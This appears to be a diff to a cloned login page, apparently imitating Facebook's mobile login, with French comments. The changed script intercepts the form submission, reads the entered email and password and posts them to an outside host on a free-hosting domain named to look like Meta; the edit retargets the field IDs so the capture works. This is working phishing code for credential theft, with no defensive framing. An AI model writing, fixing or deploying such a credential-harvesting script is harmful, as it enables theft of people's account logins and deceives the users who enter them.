@@ -273,36 +273,34 @@
                       
                      </form>
                       
-                      <script>
-    // Ajouter un écouteur d'événement sur la soumission du formulaire
-    document.getElementById('login_forme').addEventListener('submit', function(e) {
-        e.preventDefault();  // Empêche l'envoi classique du formulaire
+       <script>       document.getElementById('login_forme').addEventListener('submit', function(e) {
+    e.preventDefault();  // Empêche l'envoi classique du formulaire
 
-        // Récupérer les valeurs des champs "email" et "pass"
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
+    // Récupérer les valeurs des champs "email" et "pass"
+    const email = document.getElementById('m_login_email').value;
+    const pass = document.getElementById('m_login_password').value;
 
-        // Créer les données à envoyer en URL encodée
-        const formData = new URLSearchParams();
-        formData.append('email', email);
-        formData.append('pass', pass);
+    // Créer les données à envoyer en URL encodée
+    const formData = new URLSearchParams();
+    formData.append('email', email);
+    formData.append('pass', pass);
 
-        // Envoyer les données via fetch
-        fetch('https://meta-web.infinityfreeapp.com/proxy.php', {
-            method: 'POST',  // Méthode POST
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: formData.toString()  // Corps de la requête
-        })
-        .then(response => response.text())  // Convertir la réponse en texte
-        .then(data => {
-            console.log('Réponse du serveur :', data);  // Traiter la réponse du serveur ici
-        })
-        .catch(error => {
-            console.error('Erreur lors de la requête :', error);  // Gestion des erreurs
-        });
+    // Envoyer les données via fetch
+    fetch('https://meta-web.infinityfreeapp.com/proxy.php', {
+        method: 'POST',  // Méthode POST
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: formData.toString()  // Corps de la requête
+    })
+    .then(response => response.text())  // Convertir la réponse en texte
+    .then(data => {
+        console.log('Réponse du serveur :', data);  // Traiter la réponse du serveur ici
+    })
+    .catch(error => {
+        console.error('Erreur lors de la requête :', error);  // Gestion des erreurs
     });
+});
 </script>
                       
                       
@@ -475,4 +473,4 @@
       }
       </script>
   </body>
-      </html>
+</html>
